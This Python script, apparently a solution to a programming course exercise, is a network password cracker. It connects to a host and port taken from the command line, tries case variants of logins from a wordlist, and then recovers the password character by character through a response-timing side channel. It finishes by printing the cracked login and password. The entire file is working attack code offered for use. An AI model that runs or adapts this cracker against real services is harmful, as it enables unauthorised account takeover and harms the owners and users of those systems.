import itertools
import json
import os
import socket
import string
import sys
from datetime import datetime

HOST = sys.argv[1]
PORT = int(sys.argv[2])
ADDRESS = (HOST, PORT)


class TxtReader:
    """Read txt files"""

    def __init__(self, file_path: str):
        self.file = file_path

    def read(self) -> str:
        with open(self.file) as f:
            for line in f:
                yield line.strip()


class Hack:
    """Password cracker"""

    def __init__(self, connection, login_charset: str, password_charset: str,
                 success_message_for_login: str = "Wrong password!",
                 success_message_for_password: str = "Connection success!"):
        self.connection = connection
        self.login_charset = login_charset
        self.password_charset = password_charset
        self.success_message_for_login = success_message_for_login
        self.success_message_for_password = success_message_for_password
        self.login = None
        self.password = None

    def __str__(self):
        return json.dumps({"login": self.login, "password": self.password}, indent=4)

    def brute_force_password(self, min_length: int = 1, max_length: int = 1) -> str:
        """Iterates over all possible combinations characters of charset from minimum to maximum length.
            If receives in response success_message returns password"""

        request_template = {
            "login": self.login,
            "password": " "
        }

        correct_password_message = json.dumps({"result": self.success_message_for_password})
        start_password = ""
        while True:

            for char in self.brute_force(min_length, max_length):
                password = start_password + char
                request_template["password"] = password
                request_template = json.dumps(request_template)

                start = datetime.now()
                correct_password = self.send_data(request_template)
                finish = datetime.now()
                difference = (finish - start).total_seconds()

                if difference > 0.01:
                    start_password = password
                    request_template = json.loads(request_template)
                    break

                elif correct_password == correct_password_message:
                    self.password = password
                    return password

                request_template = json.loads(request_template)

    def brute_typical_login(self, request_template: dict) -> str:
        """Iterates over all possible combinations of case letters from charset.
            If receives in response success_message returns login"""

        correct_login_message = json.dumps({"result": self.success_message_for_login})

        for login in self.generate_typical():
            request_template["login"] = login
            request_template = json.dumps(request_template)
            correct_login = self.send_data(request_template)

            if correct_login == correct_login_message:
                self.login = login
                return login

            request_template = json.loads(request_template)

    def brute_force(self, min_length: int, max_length: int) -> str:
        """Takes minimum and maximum combination length. Generates all possible combinations from a charset"""

        for length in range(min_length, max_length + 1):
            for char in itertools.product(self.password_charset, repeat=length):
                yield "".join(char)

    def generate_typical(self) -> str:
        """Generates all possible combinations of case letters from a takes charset"""

        for login in self.login_charset:
            password_chars = [{char.upper(), char.lower()} for char in
                              login]  # set char for drops duplicates non-alpha symbols
            for pwd in itertools.product(*password_chars):
                yield "".join(pwd)

    def send_data(self, message: str) -> str:
        """Sends the message by the connection and returns response"""

        encoded_password = message.encode()
        try:
            self.connection.send(encoded_password)
            response = self.connection.recv(1024)
            response = response.decode()
            return response
        except ConnectionAbortedError:
            pass


def main():
    password_charset = string.ascii_letters + string.digits

    path_to_logins = f"{os.path.join(os.path.dirname(os.path.abspath(__file__)))}\\logins.txt"
    login_charset = TxtReader(path_to_logins).read()

    request_template = {
        "login": " ",
        "password": " "
    }

    with socket.socket() as connection:
        connection.connect(ADDRESS)
        admin_account = Hack(connection, login_charset, password_charset)

        admin_account.brute_typical_login(request_template)
        admin_account.brute_force_password()

    print(admin_account)


if __name__ == "__main__":
    main()
